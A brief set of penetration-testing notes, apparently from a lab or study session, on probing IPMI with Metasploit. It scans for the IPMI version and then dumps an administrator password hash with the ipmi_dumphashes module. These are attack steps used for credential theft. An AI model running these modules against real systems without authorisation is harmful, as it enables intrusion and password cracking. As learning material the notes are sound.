## Version Scan
```bash
use auxiliary/scanner/ipmi/ipmi_version
```
![[Screenshot 2026-09-16 at 1.07.10 AM.png]]
- We discover the IPMI 2.0

---
## Dumping Password Hashes
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
![[Screenshot 2026-09-16 at 1.08.29 AM.png]]
- Once you set all the options
- This is example output. User ADMIN and we got the hash